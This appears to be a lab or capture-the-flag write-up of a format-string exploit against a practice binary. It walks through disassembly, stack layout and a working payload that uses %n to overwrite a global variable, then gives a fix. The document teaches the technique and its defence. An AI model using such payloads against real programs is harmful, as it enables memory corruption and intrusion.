## ex07 — Format-string write via `printf(user_input)`

Goal: `you have modified the target :)`

## Assembly

```
08048454 <vuln>:
    sub    esp, 0x218
    ; fgets(buf, 0x200, stdin)
    lea    eax, [ebp-0x208]      ; &buf
    mov    [esp], eax
    mov    [esp+4], 0x200
    mov    eax, ds:0x80496d8     ; stdin
    mov    [esp+8], eax
    call   fgets
    ; printf(buf)                 <-- VULN: user-controlled format string
    lea    eax, [ebp-0x208]
    mov    [esp], eax
    call   printf
    ; if (target == 0x40) puts("you have modified the target :)")
    mov    eax, ds:0x80496e4     ; target
    cmp    eax, 0x40
    jne    .lose
    ...
```

`target` is a 4-byte global in `.bss` at **`0x080496e4`** and must equal
`0x40` (= 64 decimal).

## Stack layout at `printf`

```
esp     -> [format ptr = &buf]     ; the arg pushed for printf itself
esp+4   -> variadic slot 1
esp+8   -> variadic slot 2
esp+0xC -> variadic slot 3
esp+0x10-> variadic slot 4   <-- buf[0..3]  (buf sits at ebp-0x208, esp+0x10)
```

Probing with `AAAA %1$x %2$x %3$x %4$x ...` prints `41414141` at position 4,
confirming `%4$` addresses the first four bytes of our own input.

## Exploit

Put the address of `target` at `buf[0..3]`, print enough filler to reach a
character count of 64, then use `%4$n` to write that count to `*target`:

```bash
python3 -c "
import sys, struct
sys.stdout.buffer.write(struct.pack('<I', 0x080496e4) + b'%60x%4\$n\n')
" | ./ex07/bin
```

Breakdown of the payload:
- 4 bytes: little-endian `&target` → chars already printed = 4
- `%60x`: prints a variadic int as a 60-wide field → chars printed = 4 + 60 = 64
- `%4$n`: writes the running count (64 = `0x40`) to the address at slot 4,
  which is `&target`

Output:
```
�                                                         200
you have modified the target :)
```

## Fix

Never pass user data as a format string. `printf(buf)` should be
`printf("%s", buf)` or `fputs(buf, stdout)`. Building with
`-Wformat -Wformat-security` turns this exact pattern into a compile error.
